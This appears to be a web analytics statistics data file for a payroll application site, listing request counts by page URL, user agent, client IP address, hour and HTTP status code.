3	24	0	4	0	25610966	25610966	0	25409678	25409678	0	448365	http://tikone.cloudwage.com/contracts/22/edit
3	19	0	0	0	25022142	0	0	24889660	0	0	78697	http://tikone.cloudwage.com/advances
3	2	0	0	0	25543285	0	0	25543285	0	0	136261	http://tikone.cloudwage.com/payroll/226
3	1	0	1	0	25455885	25455885	0	25455885	25455885	0	71107	http://tikone.cloudwage.com/contracts/25/edit
3	2	0	0	0	24849511	0	0	24849511	0	0	9828	http://tikone.cloudwage.com/policies/5
3	31	0	0	0	25259747	0	0	24745766	0	0	28950	http://tikone.cloudwage.com/admin/layout4/css/themes/default.css
3	2	0	0	0	24992076	0	0	24830921	0	0	12880	http://tikone.cloudwage.com/deductions/2/edit
3	1	0	1	0	24847906	24847906	0	24847906	24847906	0	4530	http://tikone.cloudwage.com/employees/10/edit
3	22	0	3	0	25610966	25610966	0	25455888	25455888	0	253310	http://tikone.cloudwage.com/contracts/28/edit
3	2	0	0	0	24888391	0	0	24888391	0	0	23327	http://tikone.cloudwage.com/payroll/221
3	0	0	0	2	0	0	24830717	0	0	24830717	0	http://tikone.cloudwage.com/employee-deductions/3/edit
3	4	0	3	1	24830616	24804871	24830616	24804870	24804870	24830616	18132	http://tikone.cloudwage.com/payment-methods/create
3	2	0	0	0	25671509	0	0	25671508	0	0	63972	http://tikone.cloudwage.com/payroll/0?sub=10-2018
3	13	2	3	0	24992110	24830581	0	24804837	24804838	0	47391	http://tikone.cloudwage.com/profile
4	71	1	4	0	25842933	25842933	0	25842932	25842932	0	864042	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
4	33	0	3	0	25562519	25562519	0	25562518	25562518	0	284666	Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/67.0.3396.87 Mobile/15G77 Safari/604.1
4	2	0	0	2	25677418	0	25677418	25658978	0	25658978	48	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
4	0	0	1	0	0	25681753	0	0	25681753	0	0	Mozilla/5.0 (compatible; nsrbot/1.0; &#43;http://netsystemsresearch.com)
4	2	0	6	0	25753492	25753550	0	25536714	25536714	0	13524	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
4	145	9	19	0	24850703	24850589	0	24847898	24847898	0	986766	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36
4	183	7	33	6	24836662	24836662	24830922	24830709	24830709	24830717	1359507	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36
4	285	5	9	0	25372307	25372306	0	25370614	25370614	0	3144821	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:59.0) Gecko/20100101 Firefox/59.0
4	84	2	9	0	25259759	25259759	0	25258569	25258570	0	1739346	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063
4	2	0	3	0	25959354	25959354	0	25958858	25958858	0	12874	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
4	1	0	2	0	25920048	25920048	0	25920048	25920048	0	4540	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0;)
4	16	0	9	0	25968487	25968487	0	25916913	25916913	0	4868	Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)
4	2	0	7	9	25913629	25913630	25913632	25913627	25913626	25720783	12792	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
4	0	0	0	4	0	0	25666681	0	0	25666681	0	Mozilla/5.0 (Windows; U; Windows NT 6.0) Gecko/20091201 Firefox/3.5.6 GTB5
4	362	6	28	4	24939007	24939007	24938597	24938568	24938568	24938597	2577348	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
4	0	0	3	0	0	25926017	0	0	25758891	0	0	Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)
4	2257	11	112	0	25843044	25842935	0	25366222	25366223	0	33004080	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
4	0	0	3	0	0	25843392	0	0	25732777	0	0	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
4	5	0	5	7	25913165	25913165	25913165	25425217	25425217	25913165	48610	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
4	0	0	0	1	0	0	25908489	0	0	25908489	0	Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
4	630	10	63	0	25022198	25022171	0	24981927	24981927	0	4397485	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
4	0	0	4	12	0	25719055	25719055	0	25719055	25711620	0	Mozilla/5.0 (SIMON SMITH NT 10.0; WOW64; forensic@evestigator.com.au) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2526.73 Safari/537.36
4	79	1	2	0	24992108	24992100	0	24992099	24992099	0	591004	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/58.0.3029.110 Chrome/58.0.3029.110 Safari/537.36
4	121	3	14	2	24830692	24830692	24830662	24830658	24830658	24830659	1249560	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36
4	59	0	0	0	25840811	0	0	24746441	0	0	4226	COMODO DCV
4	26	0	47	0	25904858	25904858	0	24819663	24819663	0	202554	Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)
4	12	0	13	1	25929367	25929366	25778554	25532071	25532071	25778554	69726	Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36
4	77	1	3	4	24888393	24888390	24888389	24888388	24888388	24888389	906843	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36
4	33	0	2	0	24831938	24831938	0	24831937	24831937	0	267611	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8
4	88	0	2	0	25429357	25429357	0	25429357	25429357	0	1146663	Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko
4	84	0	6	0	24748739	24748739	0	24745758	24745759	0	719796	Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
4	1339	10	56	1	25671512	25671512	25610959	25556454	25556454	25610959	17965240	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134
4	93	1	4	0	24745766	24746051	0	24745759	24745758	0	698323	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
4	63	1	1	1	24898173	24898170	24898348	24898170	24898170	24898348	539898	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36
4	75	1	5	0	25200988	25200988	0	25200901	25200901	0	933857	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393
4	80	1	5	0	25259755	25259755	0	25259746	25259746	0	1365257	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
4	70	2	6	0	24804836	24804836	0	24804712	24804712	0	577467	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
4	1	0	1	0	25529172	25529172	0	25529172	25529172	0	6762	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36
4	337	9	26	3	24889900	24889685	24888387	24859594	24859594	24888362	2416730	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
4	172	2	5	0	25966992	25966992	0	25966626	25966625	0	2286284	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
4	1525	38	226	63	24855134	24855079	24849575	24804837	24804837	24830616	9424138	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
4	0	0	0	5	0	0	25665578	0	0	25665578	0	fasthttp
4	63	0	2	0	25723633	25723633	0	25723633	25723633	0	555512	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
4	1	0	1	0	25818827	25818827	0	25818827	25818827	0	4499	Mozilla/5.0 zgrab/0.x
4	10	0	0	0	24855893	0	0	24746440	0	0	574	Cpanel-HTTP-Client/1.0
4	0	0	0	15	0	0	25711187	0	0	25705466	0	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2526.73 Safari/537.36
4	0	0	0	2	0	0	25628882	0	0	25628882	0	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
5	1	0	2	0	25252891	25252891	0	25252891	25252891	0	6762	159.89.184.195
5	0	0	1	0	0	25951530	0	0	25951530	0	0	54.36.149.48
5	1	0	1	0	24950676	24950676	0	24950676	24950676	0	6890	138.197.22.244
5	1356	5	45	0	25501554	25501554	0	25455882	25455882	0	17617457	154.70.51.92
5	1	0	1	7	25913165	25913165	25913165	25913165	25913165	25913165	21562	159.69.157.248
5	285	5	9	0	25372307	25372306	0	25370614	25370614	0	3144821	197.232.22.220
5	1	0	2	0	25042013	25042013	0	25042013	25042013	0	6762	165.227.65.118
5	1	0	0	0	25840811	0	0	25840811	0	0	64	213.136.80.121
5	86	1	7	0	25671512	25671512	0	25671501	25671502	0	1899186	196.207.154.206
5	1	0	0	0	25925534	0	0	25925534	0	0	24	54.36.150.38
5	1	0	0	1	25658978	0	25658978	25658978	0	25658978	24	188.165.254.65
5	0	0	1	0	0	25758891	0	0	25758891	0	0	209.17.96.26
5	1	0	1	0	24869892	24869892	0	24869892	24869892	0	6890	138.197.117.183
5	88	2	2	0	24848099	24848099	0	24830658	24830862	0	844478	66.249.93.217
5	89	4	3	1	24847899	24847898	24830717	24830658	24830658	24830717	490332	66.249.93.216
5	115	4	2	0	24848100	24848099	0	24830658	24830927	0	1077474	66.249.93.215
5	1	0	2	0	25513119	25513119	0	25513119	25513119	0	6762	209.97.145.252
5	0	0	1	0	0	25935498	0	0	25935498	0	0	54.36.150.31
5	1	0	2	0	25130833	25130833	0	25130833	25130833	0	6762	174.138.58.15
5	0	0	4	27	0	25719055	25719055	0	25719055	25705466	0	94.102.57.141
5	897	16	129	33	24868071	24868070	24849575	24830579	24830579	24830616	5960484	154.70.36.78
5	2	1	0	0	24870980	0	0	24870980	0	0	3919	154.70.33.91
5	1	0	3	0	25536714	25537687	0	25536714	25536714	0	6762	122.228.10.51
5	1	0	2	0	25904858	25904858	0	25904858	25904858	0	15462	159.65.240.114
5	1	0	1	0	25621367	25621367	0	25621367	25621367	0	6762	34.241.151.9
5	1	0	2	0	25817735	25817735	0	25817735	25817735	0	15464	68.183.146.18
5	1	0	0	0	25959534	0	0	25959534	0	0	24	54.36.149.103
5	0	0	1	0	0	25732777	0	0	25732777	0	0	212.83.146.233
5	0	0	0	1	0	0	25628882	0	0	25628882	0	144.168.163.10
5	615	14	113	26	24855134	24855079	24849549	24804858	24804858	24836687	3664429	154.70.38.214
5	1	0	0	0	25950549	0	0	25950549	0	0	4508	54.36.149.19
5	1	0	1	0	25564891	25564891	0	25564891	25564891	0	6762	107.22.128.12
5	0	0	0	1	0	0	25778554	0	0	25778554	0	54.215.185.56
5	1	0	0	0	25968487	0	0	25968487	0	0	24	54.36.148.135
5	152	4	12	0	24806080	24806007	0	24804837	24804712	0	1212597	196.207.135.93
5	107	3	19	2	24889900	24889685	24888362	24886807	24886808	24888362	546627	154.70.33.249
5	529	3	51	0	25435737	25435737	0	25409503	25409532	0	10318202	154.70.14.151
5	81	1	3	1	24888391	24888388	24888389	24745759	24804712	24888389	864189	66.249.93.23
5	69	2	1	1	24888392	24888390	24888389	24745759	24888390	24888389	501393	66.249.93.22
5	1	0	1	0	25468530	25468530	0	25468530	25468530	0	6762	54.80.251.100
5	76	0	2	0	24888392	24804835	0	24745759	24748739	0	736084	66.249.93.21
5	80	1	5	0	25259755	25259755	0	25259746	25259746	0	1365257	154.70.14.145
5	1	0	2	0	25212974	25212974	0	25212974	25212973	0	6762	165.227.66.193
5	1	0	2	0	25296235	25296235	0	25296235	25296235	0	6762	104.236.17.43
5	2	0	7	7	25913629	25913630	25913632	25913627	25913626	25913626	12792	192.99.15.55
5	0	0	1	0	0	25918569	0	0	25918569	0	0	209.17.97.34
5	92	3	3	1	24889679	24889659	24888387	24888386	24888386	24888387	741549	154.70.36.50
5	1	0	0	0	25959838	0	0	25959838	0	0	24	54.36.148.95
5	1	0	1	0	25645955	25645954	0	25645955	25645954	0	6762	34.240.104.163
5	1	0	0	0	25967843	0	0	25967843	0	0	24	54.36.148.92
5	1	0	2	0	25382999	25382999	0	25382999	25382999	0	6762	104.131.124.54
5	1	0	1	0	25643637	25643637	0	25643637	25643637	0	6762	54.202.205.240
5	0	0	0	1	0	0	25908489	0	0	25908489	0	5.62.63.226
5	1	0	2	0	25643984	25643984	0	25643984	25643984	0	6762	142.93.78.230
5	1	0	0	0	25916913	0	0	25916913	0	0	24	54.36.148.87
5	1	0	1	0	25425217	25425217	0	25425217	25425217	0	6762	52.196.92.112
5	1	0	0	0	25935498	0	0	25935498	0	0	24	54.36.148.105
5	1	0	0	0	25927780	0	0	25927780	0	0	24	54.36.148.103
5	1	0	0	1	25677418	0	25677418	25677418	0	25677418	24	192.99.8.157
5	0	0	0	5	0	0	25665578	0	0	25665578	0	212.8.253.137
5	1	0	1	0	25532071	25532071	0	25532071	25532071	0	6762	34.209.130.121
5	0	0	0	2	0	0	25720783	0	0	25720783	0	200.16.134.35
5	1	0	2	0	25174739	25174739	0	25174739	25174739	0	6762	45.55.226.22
5	63	1	1	1	24898173	24898170	24898348	24898170	24898170	24898348	539898	154.70.36.34
5	652	13	59	13	25966992	25966992	24888389	24745758	24745758	24830916	6509687	197.248.207.206
5	1	0	1	0	25929367	25929366	0	25929367	25929366	0	4654	13.250.53.48
5	0	0	1	0	0	25959838	0	0	25959838	0	0	54.36.148.80
5	1	0	2	0	25252990	25252990	0	25252990	25252990	0	6762	159.89.188.122
5	1	0	0	0	25950549	0	0	25950549	0	0	24	54.36.148.248
5	0	0	1	0	0	25681753	0	0	25681753	0	0	196.52.43.69
5	1	0	2	0	25600088	25600088	0	25600088	25600088	0	6762	165.227.118.179
5	33	0	3	0	25562519	25562519	0	25562518	25562518	0	284666	105.54.197.234
5	0	0	1	0	0	25843383	0	0	25843383	0	0	51.255.109.172
5	417	5	20	0	25022185	25022167	0	24938593	24938593	0	3135942	154.70.36.19
5	2	0	3	0	25959354	25959354	0	25958858	25958858	0	12874	193.70.34.209
5	37	0	2	0	25366232	25366231	0	25366222	25366223	0	291428	197.237.102.222
5	88	0	2	0	25429357	25429357	0	25429357	25429357	0	1146663	13.56.223.251
5	1	0	2	0	25565406	25565406	0	25565406	25565406	0	6762	159.65.242.119
5	0	0	1	0	0	25926630	0	0	25926630	0	0	54.36.148.59
5	1	0	2	0	25080492	25080492	0	25080492	25080492	0	6762	45.55.182.77
5	0	0	1	0	0	25843392	0	0	25843392	0	0	51.255.109.161
5	1	0	2	0	24991100	24991100	0	24991100	24991100	0	6762	45.55.192.212
5	0	0	1	0	0	25926017	0	0	25926017	0	0	209.17.96.234
5	1	0	1	0	25916913	25916913	0	25916913	25916913	0	24	54.36.148.228
5	1	0	2	0	25424571	25424571	0	25424571	25424571	0	6762	165.227.190.238
5	1	0	1	0	25621427	25621427	0	25621427	25621427	0	6762	54.160.114.23
5	1	0	3	0	25753492	25753550	0	25753492	25753492	0	6762	122.228.19.80
5	1	0	2	0	25920048	25920048	0	25920048	25920048	0	4540	88.198.39.184
5	1	0	1	0	25818827	25818827	0	25818827	25818827	0	4499	171.67.70.49
5	1	0	1	0	25529172	25529172	0	25529172	25529172	0	6762	80.93.187.145
5	1	0	1	0	25798688	25798688	0	25798688	25798688	0	4667	52.53.201.211
5	0	0	0	1	0	0	25628882	0	0	25628882	0	209.97.157.175
5	813	15	87	4	25259759	25259759	24938597	24938568	24938568	24938597	7103098	197.237.34.171
5	26	0	0	0	25731488	0	0	25184008	0	0	1872	23.254.153.210
5	0	0	1	0	0	25601382	0	0	25601382	0	0	54.237.103.209
5	23	2	3	0	24850679	24850589	0	24849511	24849511	0	110094	66.249.93.94
5	1	0	1	0	25514960	25514960	0	25514960	25514960	0	6762	13.112.133.23
5	0	0	1	0	0	25949368	0	0	25949368	0	0	54.36.148.212
5	1	0	1	0	25926630	25926630	0	25926630	25926630	0	24	54.36.149.81
5	1	0	0	0	25948696	0	0	25948696	0	0	24	54.36.148.37
5	1	0	0	0	25926263	0	0	25926263	0	0	24	54.36.148.36
5	1	0	2	0	25860174	25860174	0	25860174	25860174	0	15462	134.209.42.16
5	1460	11	60	1	25634121	25634121	25610959	25536396	25536396	25610959	19667529	196.207.177.95
5	1	0	1	0	25682978	25682978	0	25682978	25682978	0	6762	54.204.209.28
5	1	0	1	0	24819771	24819771	0	24819771	24819771	0	6890	138.197.2.212
5	1	0	2	0	25734441	25734441	0	25734441	25734440	0	6762	142.93.73.91
5	1	0	1	0	25470627	25470627	0	25470627	25470627	0	6762	54.80.186.94
5	1	0	1	0	25649586	25649585	0	25649586	25649585	0	6762	54.144.155.178
5	1	0	1	0	25796823	25796823	0	25796823	25796823	0	1646	34.247.86.110
5	1	0	1	0	24819663	24819663	0	24819663	24819663	0	6890	138.197.4.44
5	1	0	1	0	24869986	24869986	0	24869986	24869986	0	6890	159.203.99.110
5	1	0	1	0	25949368	25949368	0	25949368	25949368	0	24	54.36.149.62
5	20	0	0	0	25074773	0	0	24746440	0	0	1220	104.168.149.245
5	24	3	1	0	24850703	24849524	0	24849511	24849524	0	127303	66.249.93.68
5	1	0	2	0	25080231	25080231	0	25080231	25080231	0	6762	104.131.33.129
5	20	2	1	0	24850679	24849511	0	24849511	24849511	0	97458	66.249.93.65
5	22	0	0	0	25840811	0	0	24746441	0	0	1644	91.199.212.132
5	1	0	1	0	25863289	25863289	0	25863289	25863289	0	4663	3.87.240.196
5	0	0	1	0	0	25968487	0	0	25968487	0	0	54.36.148.169
5	0	0	0	4	0	0	25666681	0	0	25666681	0	82.102.27.10
5	1	0	0	0	25934633	0	0	25934633	0	0	24	54.36.150.52
5	1	0	2	0	25174832	25174832	0	25174832	25174832	0	6762	165.227.75.29
z	0	574	0	25966992	0
z	1	1	0	24836677	1
z	2	88	0	25968487	5316
z	3	883	0	25966992	464649
z	4	5224	92	25966992	22177070
z	5	1636	14	25966992	58529756
z	6	82	15	25966992	9211049
c	200	8364	25968487
c	206	2	24836677
c	301	44	25958858
c	302	706	25968487
c	304	122	25843044
c	404	58	25913632
c	500	84	25778554
